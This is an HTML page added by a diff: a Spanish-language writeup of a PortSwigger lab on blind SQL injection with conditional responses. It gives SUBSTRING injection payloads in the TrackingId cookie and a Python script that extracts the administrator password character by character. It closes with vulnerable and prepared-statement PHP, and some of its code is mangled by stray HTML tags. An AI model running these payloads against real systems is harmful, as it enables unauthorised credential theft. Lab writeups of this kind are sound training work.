@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Blind SQLi — Condicional (SUBSTRING) | MeloRZ</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css"/>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <nav class="navbar">
+    <div class="nav-brand"><span class="bracket">[</span><span class="brand-name">MeloRZ</span><span class="bracket">]</span></div>
+    <ul class="nav-links">
+      <li><a href="../../index.html#writeups" class="nav-link">← Writeups</a></li>
+    </ul>
+    <div class="nav-status"><span class="status-dot"></span><span class="status-text">ONLINE</span></div>
+  </nav>
+  <div class="writeup-page">
+    <a href="../../index.html" class="writeup-back">← Volver al portafolio</a>
+    <div class="writeup-header">
+      <div class="writeup-meta">
+        <span class="card-badge ps">PS Lab</span>
+        <span class="card-difficulty easy">EASY</span>
+      </div>
+      <h1 class="writeup-title">Blind SQLi — Condicional (SUBSTRING)</h1>
+      <div class="writeup-info">
+        <span>Plataforma: <strong style="color:var(--blue-bright)">PortSwigger Labs</strong></span>
+        <span>Tags: <span>SQLi</span><span>Blind</span><span>SUBSTRING</span></span>
+      </div>
+    </div>
+    <div class="writeup-body">
+
+<h2>Uso de SUBSTRING con respuestas condicionales</h2>
+
+<p>usamos esta función cuando queremos ir obteniendo los valores de la string que retorna una consulta en SQL, uno por uno. Hacemos uso de respuesta condicionales ya que igualamos el resultado de la consulta a algo para saber si es igual o no a eso.</p>
+
+<p>La metodología es simple:</p>
+
+<p>> 1-Buscamos una query de la cual queremos saber el valor que retorna y la concatenamos a la query del servidor con <code>and</code></p>
+
+<p>> 2-Le pasamos la query a la función <code>LENGTH</code> para saber la longitud de la cadena de respuesta</p>
+
+<p>>3 - Le pasamos esa query como string a la función <code>SUBSTRING()</code></p>
+
+<p>>3- vamos iterando por posiciones y valores hasta obtener el valor completo del resultado de la consulta</p>
+
+
+
+<hr>
+
+<h1>Lab Portswigger</h1>
+<h2>Verificación de vulnerabilidad</h2>
+
+
+<hr>
+
+<em>[imagen]</em>
+<p>accedemos al lab y vemos que hay un trackingID y ademas la pagina nos dice <em>Welcome back</em> eso es porque la Query del lado del servidor si encuentra nuestro TrackingID en la base de datos</p>
+
+<p>Query: <code></code>SELECT * from users where TRACKINID='gJVOQgCpXxvbKVv8' and substring((SELECT password from users WHERE username='administrator')1,1)='a''</p>
+
+<hr>
+
+<em>[imagen]</em>
+<p>si rompemos la query con un <code>'</code> al final del TrackID vemos que ya no dice welcome back, por lo tanto, es vulnerable</p>
+
+<hr>
+
+<h2>Explotación</h2>
+
+<p>Aquí deberíamos jugar con SUBSTRING tal que asi:</p>
+
+<code>gJVOQgCpXxvbKVv8' and substring((SELECT password from users WHERE username='administrator')1,1)='a'-- -</code>
+
+<p>ya que nos dijeron las columnas y tambien al usuario que debemos buscar la password, lo que hacemos es construir una query que como resultado devuelva la  password:</p>
+<code>SELECT password from users WHERE username='administrator' </code>
+
+<p>luego hacemos uso de la función <code>SUBSTRING(string,position,len)</code> y le pasamos la Query como string ya que la query devolverá la password y esa será la string.</p>
+
+<p>Luego igualamos todo eso a algo para saber si es verdadero o falso dependiendo el valor y cuando encontremos el valor para la posición uno, podemos ir verificando el de la posición dos.</p>
+
+<p>Con el siguiente script lo automatizamos:</p>
+
+<pre><code>#!/usr/bin/python3
+<p>import requests</p>
+<p>import string</p>
+
+
+#variables globales 
+
+<p>url_input= 'https://0a5700250353069d8352e10400dd0005.web-security-academy.net/'</p>
+<p>caracters= string.ascii_lowercase + string.ascii_uppercase + string.digits</p>
+<p>password= ''</p>
+
+<p>for position in range(1,25):</p>
+<p>for letter in caracters:</p>
+		
+<p>cookies = {"TrackingId":f"afgweSaBv9zubkPc' and (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{letter}'-- -","session":"cZ88aG3WPV5wkPFGgl0LFlRuHKdjiGnC"}</p>
+<p>me_request = requests.get(url=url_input, cookies=cookies)</p>
+<p>if 'Welcome' in me_request.text:</p>
+<p>password+=letter</p>
+<p>print(f"letra de la posicion {position} encontrada --> {letter}")</p>
+<p>break</p>
+<p>print(" -->", password)</code></pre></p>
+
+
+
+
+<hr>
+
+
+<pre><code><?php
+
+
+<p>// CONSULTA VULNERABLE - así NO hacerlo</p>
+<p>$query = "SELECT * FROM orders WHERE tracking_id = '$trackingID'";</p>
+<p>$stmt = $pdo->query($query);</p>
+
+<p>// CONSULTA SEGURA - así SÍ hacerlo</p>
+<p>$query = "SELECT * FROM orders WHERE tracking_id = ?";</p>
+<p>$stmt = $pdo->prepare($query);</p>
+<p>$stmt->execute([$trackingID]);</p>
+
+<p>// Verificar si existe y mostrar contenido</p>
+<p>if ($stmt->rowCount() > 0)  {</p>
+<p>$order = $stmt->fetch();</p>
+<p>echo "Welcome Back"</p>
+<p>} else {</p>
+<p>echo "";</p>
+<p>}</p>
+<p>?></code></pre></p>
+
+<p>en el backend se estaría aplicando algo como esto para saber si el trackingID existe</p>
+
+
+
+
+    </div>
+  </div>
+</body>
+</html>
